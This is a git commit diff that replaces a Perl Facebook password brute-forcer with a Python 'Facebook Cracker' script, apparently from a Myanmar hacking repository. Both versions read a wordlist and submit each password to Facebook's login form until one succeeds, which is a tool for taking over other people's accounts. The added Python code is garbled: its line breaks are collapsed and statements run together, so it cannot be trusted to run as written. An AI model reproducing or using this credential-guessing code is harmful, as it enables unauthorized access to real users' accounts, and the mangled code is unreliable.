1c63ee569164455be53d9680119510d4b039f899
Mdaytharethan <46084818+Mdaytharethan@users.noreply.github.com>
2018-12-25 20:54:42 +0630

    Update fb.py

--- fb.py
+++ fb.py
@@ -1,157 +1,17 @@
-
-use strict;
-
-use Net::SSLeay::Handle;
-
-
-if(!defined($ARGV[0] && $ARGV[1])) {
-
-
-system('clear');
-
-print "\n+++ Facebook password \n";
-
-print "+++ Coded by Imad'Ox-Hunter\n";
-
-print "+++ www.fb.com/imad.elouajib\n\n";
-
-print "+++ Usage: perl $0 login wordlist\n\n";
-
-exit; }
-
-
-my $user = $ARGV[0];
-
-my $wordlist = $ARGV[1];
-
-
-open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";
-
-
-print "\n+++ ျမန္မာ\n";
-
-print "+++ Coded by myanmarhacker\n";
-
-print "+++ www.fb.com/zawlwinoo.zawlwinoo.123123\n";
-
-print "\n[+] စျပီ $user ...\n\n";
-
-
-while (my $password = <LIST>) {
-
-chomp ($password);
-
-$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
-
-
-my $a = "POST /login.php HTTP/1.1";
-
-my $b = "Host: www.facebook.com";
-
-my $c = "Connection: close";
-
-my $e = "Cache-Control: max-age=0";
-
-my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-
-my $g = "Origin: https://www.facebook.com";
-
-my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
-
-my $i = "Content-Type: application/x-www-form-urlencoded";
-
-my $j = "Accept-Encoding: gzip,deflate,sdch";
-
-my $k = "Accept-Language: en-US,en;q=0.8";
-
-my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
-
-
-my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
-
-my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
-
-my $cl = length($post);
-
-my $d = "Content-Length: $cl";
-
-
-
-my ($host, $port) = ("www.facebook.com", 443);
-
-
-tie(*SSL, "Net::SSLeay::Handle", $host, $port);
-
-  
-
-
-print SSL "$a\n";
-
-print SSL "$b\n";
-
-print SSL "$c\n";
-
-print SSL "$d\n";
-
-print SSL "$e\n";
-
-print SSL "$f\n";
-
-print SSL "$g\n";
-
-print SSL "$h\n";
-
-print SSL "$i\n";
-
-print SSL "$j\n";
-
-print SSL "$k\n";
-
-print SSL "$l\n";
-
-print SSL "$cookie\n\n";
-
-
-print SSL "$post\n";
-
-
-my $ျပီးျပီ;
-
-while(my $result = <SSL>){
-
-if($result =~ /Location(.*?)/){
-
-$ျပီးျပီ = $1;
-
-}
-
-}
-
-if (!defined $ျပီးျပီ)
-
-{
-
-print "[-] $password -> မဟုတ္ေသးဘူး :( \n";
-
-close SSL;
-
-}
-
-else
-
-{
-
-print "\n########################################################\n";
-
-print "[+] Yuuup!!ေတြ႕ျပီ=> Password က $password :D\n";
-
-print "########################################################\n\n";
-
-close SSL;
-
-exit;
-
-}
-
-}
-
+#!/usr/bin/env python# 
+-*- coding: UTF-8 -*- 
+  import sysimport mechanizeimport cookielibimport random email = str(raw_input("fb နာမည္(or)Emailထည့္(or) ဖုန္းနံပါတ္: ")) passwordlist = str(raw_input("password file ထည့္ : ")) login = 'https://www.facebook.com/login.php?login_attempt=1' useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+  def main():	global br	br = mechanize.Browser()	
+    cj = cookielib.LWPCookieJar()	br.set_handle_robots(False)	
+    br.set_handle_redirect(True)	br.set_cookiejar(cj)	br.set_handle_equiv(True)	br.set_handle_referer(True)	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)	welcome()	search()	
+    print("Password မေတြ႕ဘူး") 	
+    def brute(password):	
+      sys.stdout.write("\r[*] ေစာင့္ပါ ..... {}\n".format(password))	
+      sys.stdout.flush()
+      br.addheaders = [('User-agent', random.choice(useragents))]	site = br.open(login)	br.select_form(nr = 0)	br.form['email'] = email	br.form['pass'] = password	sub = br.submit()	log = sub.geturl()	if log != login and (not 'login_attempt' in log):			print("\n\n[+] Password Find = {}".format(password))			raw_input("ထြက္ရန္နွိပ္ပါတစ္ခုခုကို....")			sys.exit(1) 	
+        def search():	global password	passwords = open(passwordlist,"r")	for password in passwords:		password = password.replace("\n","")		brute(password) 		#welcome def welcome():	wel = """ +=========================================+
+|.......... Facebook Crack ...........| +-----------------------------------------+ |
+#Author: Eric Ethan | |	 Version 1 | 	| 
+| +=========================================+
+|.......... Facebook Cracker ...........| 
++-----------------------------------------+\n\n"""	total = open(passwordlist,"r")	total = total.readlines()	print wel 	print " [*] Account to crack : {}".format(email)	print " [*] Loaded :" , len(total), "passwords"	print " [*] Cracking, please wait ...\n\n" 	if __name__ == '__main__':	main() 
